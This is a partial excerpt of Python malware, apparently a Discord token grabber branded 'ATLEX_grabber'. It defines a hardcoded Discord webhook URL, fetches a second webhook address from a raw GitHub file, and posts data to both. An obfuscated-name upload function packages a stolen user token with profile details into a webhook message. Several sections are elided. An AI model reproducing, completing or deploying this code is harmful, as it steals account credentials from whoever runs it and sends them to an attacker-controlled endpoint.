...
smallcname = "ATLEX_grabber"

footerc = "Made By https://github.com/lubrj"

words = "Grabber"

h00k2 = requests.get("https://raw.githubusercontent.com/lubrj/saves/refs/heads/main/hook1").text.strip().replace('"', '')
h00k = "https://discord.com/api/webhooks/1350872640793088122/5CDjFKZ7NJJHup9NzEwc_Esqwb3bPTOJ_Z8vFNw79MVX65r3tN_fMwfG97czlyUqL6PG"
    ...
    for i in range(8):
        try:
            if headers != '':
                ...
                r = urlopen(Request(h00k2, data=data, headers=headers))
            else:
                r = urlopen(Request(h00k, data=data))
                r = urlopen(Request(h00k2, data=data))
            return r
        except: 
           pass
...
def UP104D70K3N(token, path):
    ...
    pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}" if pfp != None else "https://ibb.co/MBJCLpg"
    ...
    data = {
        ...
        "username": f"{cname}",
        "avatar_url": "https://ibb.co/MBJCLpg",
        "attachments": []
        }
